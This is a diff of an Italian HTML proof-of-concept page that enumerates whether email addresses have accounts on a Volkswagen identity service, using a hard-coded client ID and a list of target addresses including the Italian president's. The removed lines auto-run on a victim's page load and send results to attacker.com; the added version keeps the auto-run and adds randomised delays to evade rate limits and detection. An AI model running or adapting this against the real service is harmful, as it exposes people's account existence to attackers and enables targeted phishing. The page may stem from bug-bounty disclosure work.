@@ -2,73 +2,122 @@
 <html lang="it">
 <head>
   <meta charset="UTF-8">
-  <title>Volkswagen ID Checker (innocuo...)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifica Email VW - PoC</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f8f9fa; }
+    h1 { color: #333; }
+    pre { background: #fff; padding: 15px; border: 1px solid #ddd; border-radius: 6px; overflow: auto; max-height: 400px; }
+    .status { font-weight: bold; margin: 15px 0; }
+    .error { color: #d32f2f; }
+    .success { color: #2e7d32; }
+  </style>
 </head>
 <body>
-  <h1>Caricamento...</h1>
-  <p id="status">Attendi un attimo...</p>
+  <h1>Verifica esistenza email (PoC dimostrativo)</h1>
+  <p class="status" id="status">Inizio controllo...</p>
+  <pre id="result"></pre>
 
   <script>
-    // Lista di email da testare (in real attack: caricata da un file o generata)
+    // Configurazione
+    const TARGET_URL = "https://identity.vwgroup.io/v2/login/ui/sign-up/check-email";
+    const CLIENT_ID = "4fb52a96-2ba3-4f99-a3fc-583bb197684b@apps_vw-dilab_com";
+
+    // Email di test (modifica con le tue)
     const emailsToCheck = [
       "mario.rossi@gmail.com",
       "anna.verdi@libero.it",
       "codenamevenom@bugcrowdninja.com",
-      "presidente@quirinale.it",           // test per VIP / noti
-      // ... puoi caricare migliaia da un array o fetch
+      "presidente@quirinale.it",
+      "test123456789abcdef@example.com"
     ];
 
-    const clientId = "4fb52a96-2ba3-4f99-a3fc-583bb197684b@apps_vw-dilab_com";
     const results = {};
+    const outputElement = document.getElementById("result");
+    const statusElement = document.getElementById("status");
 
     async function checkEmail(email) {
+      const log = (msg, type = 'info') => {
+        console.log(`[${email}] ${msg}`);
+        if (type === 'error') console.error(`[${email}] ${msg}`);
+      };
+
       try {
-        const response = await fetch("https://identity.vwgroup.io/v2/login/ui/sign-up/check-email", {
+        log("Invio richiesta...");
+
+        const response = await fetch(TARGET_URL, {
           method: "POST",
-          credentials: "include",
           mode: "cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, clientId })
+          cache: "no-cache",
+          credentials: "omit",               // ← MOLTO IMPORTANTE: omit, NON include
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify({
+            email: email,
+            clientId: CLIENT_ID
+          })
         });
 
-        if (!response.ok) throw new Error("Non 200");
+        log(`Status: ${response.status}`);
 
-        const data = await response.json();
-        results[email] = data.exists === true ? "ESISTE" : "NON esiste";
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}`);
+        }
 
-        // Invia al server attaccante (es. webhook o tuo endpoint)
-        fetch("https://attacker.com/log", {
-          method: "POST",
-          body: JSON.stringify({ email, exists: data.exists, timestamp: Date.now() })
-        }).catch(() => {});
+        let data;
+        try {
+          data = await response.json();
+          log("Risposta JSON ricevuta");
+        } catch (jsonErr) {
+          log("Non è JSON valido: " + jsonErr.message, 'error');
+          data = { error: "Risposta non JSON", raw: await response.text() };
+        }
+
+        results[email] = {
+          exists: data.exists ?? "sconosciuto",
+          fullResponse: data,
+          status: response.status
+        };
+
+        if (data.exists === true) {
+          statusElement.innerHTML += `<br><span class="success">ESISTE → ${email}</span>`;
+        } else if (data.exists === false) {
+          statusElement.innerHTML += `<br><span class="success">NON esiste → ${email}</span>`;
+        }
 
       } catch (err) {
-        results[email] = "ERRORE: " + err.message;
+        log("Errore fetch: " + err.message, 'error');
+        results[email] = {
+          error: err.message,
+          note: "Probabile blocco CORS / rete / estensioni browser"
+        };
       }
     }
 
-    async function runChecks() {
-      document.getElementById("status").textContent = "Sto controllando... non chiudere la pagina!";
+    async function runAllChecks() {
+      statusElement.textContent = "Controllo in corso... (non chiudere la pagina)";
       
       for (const email of emailsToCheck) {
         await checkEmail(email);
-        await new Promise(r => setTimeout(r, 800)); // evita rate-limit se presente
+        // Piccolo delay per evitare rate-limit o rilevamento
+        await new Promise(resolve => setTimeout(resolve, 1200 + Math.random() * 800));
       }
 
-      // Alla fine mostra o invia tutto
-      console.log("RISULTATI:", results);
-      document.getElementById("status").innerHTML = 
-        "<h2>Controllo completato!</h2><pre>" + JSON.stringify(results, null, 2) + "</pre>";
-      
-      // Invia tutti i risultati all'attaccante
-      fetch("https://attacker.com/full-dump", {
-        method: "POST",
-        body: JSON.stringify(results)
-      });
+      statusElement.textContent = "Controllo completato!";
+      outputElement.textContent = JSON.stringify(results, null, 2);
+
+      console.log("RISULTATI FINALI:", results);
     }
 
-    // Avvia automaticamente quando la vittima carica la pagina
-    window.onload = runChecks;
+    // Avvia automaticamente
+    window.addEventListener("load", () => {
+      runAllChecks().catch(err => {
+        console.error("Errore generale:", err);
+        statusElement.textContent = "Errore durante l'esecuzione";
+      });
+    });
   </script>
 </body>
 </html>
